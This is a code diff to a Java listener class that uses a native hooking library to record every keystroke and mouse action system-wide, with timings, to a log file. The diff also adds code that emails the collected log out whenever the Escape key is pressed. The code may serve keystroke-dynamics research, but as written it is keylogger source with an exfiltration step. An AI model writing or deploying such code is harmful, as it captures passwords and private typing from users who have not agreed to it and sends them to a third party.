@@ -5,6 +5,10 @@
  */
 package ai;
 
+import java.util.logging.Level;
+import java.util.logging.Logger;
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 import org.jnativehook.mouse.NativeMouseEvent;
@@ -23,8 +27,6 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
-        FileManager fm = new FileManager();
-        fm.write("Key Typed: " + e.getKeyText(e.getKeyCode()));
     }
 
     @Override
@@ -32,8 +34,15 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         this.endTime = System.nanoTime();
         long t = this.endTime - this.startTime;
         FileManager fm = new FileManager();
-        fm.write("Key Pressed: " + t + "," + e.getKeyText(e.getKeyCode()));
+        fm.write("Key,Pressed," + t + "," + e.getKeyText(e.getKeyCode()));
         this.startTime = System.nanoTime();
+        
+        
+        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+            EmailManager email = new EmailManager();
+            email.enviarCorreo();
+        }
+        
     }
 
     @Override
@@ -41,17 +50,13 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         this.endTime = System.nanoTime();
         long t = this.endTime - this.startTime;
         FileManager fm = new FileManager();
-        fm.write("Key Released: " + t + "," + e.getKeyText(e.getKeyCode()));
+        fm.write("Key,Released," + t + "," + e.getKeyText(e.getKeyCode()));
         this.startTime = System.nanoTime();
     }
 
     @Override
     public void nativeMouseClicked(NativeMouseEvent e) {
-        this.endTime = System.nanoTime();
-        long t = this.endTime - this.startTime;
-        FileManager fm = new FileManager();
-        fm.write("Mouse Clicked: " + t + "," + e.getClickCount());
-        this.startTime = System.nanoTime();
+        
     }
 
     @Override
@@ -59,7 +64,7 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         this.endTime = System.nanoTime();
         long t = this.endTime - this.startTime;
         FileManager fm = new FileManager();
-        fm.write("Mouse Pressed: " + t + "," + e.getButton());
+        fm.write("Mouse,Pressed," + t + "," + e.getButton());
         this.startTime = System.nanoTime();
     }
 
@@ -68,7 +73,7 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         this.endTime = System.nanoTime();
         long t = this.endTime - this.startTime;
         FileManager fm = new FileManager();
-        fm.write("Mouse Released: " + t + "," + e.getButton());
+        fm.write("Mouse,Released," + t + "," + e.getButton());
         this.startTime = System.nanoTime();
 
     }
@@ -78,7 +83,7 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         this.endTime = System.nanoTime();
         long t = this.endTime - this.startTime;
         FileManager fm = new FileManager();
-        fm.write("Mouse Moved: " + t + "," + e.getX() + ", " + e.getY());
+        fm.write("Mouse,Moved," + t + "," + e.getX() + "," + e.getY());
         this.startTime = System.nanoTime();
 
     }
@@ -88,7 +93,7 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         this.endTime = System.nanoTime();
         long t = this.endTime - this.startTime;
         FileManager fm = new FileManager();
-        fm.write("Mouse Dragged: " + t + "," + e.getX() + ", " + e.getY());
+        fm.write("Mouse,Dragged," + t + "," + e.getX() + "," + e.getY());
         this.startTime = System.nanoTime();
 
     }
@@ -98,7 +103,7 @@ public class ListenerAdapter implements NativeKeyListener, NativeMouseInputListe
         this.endTime = System.nanoTime();
         long t = this.endTime - this.startTime;
         FileManager fm = new FileManager();
-        fm.write("Mouse Wheel Moved: " + t + "," + e.getWheelRotation());
+        fm.write("Mouse,Wheel," + t + "," + e.getWheelRotation());
         this.startTime = System.nanoTime();
 
     }
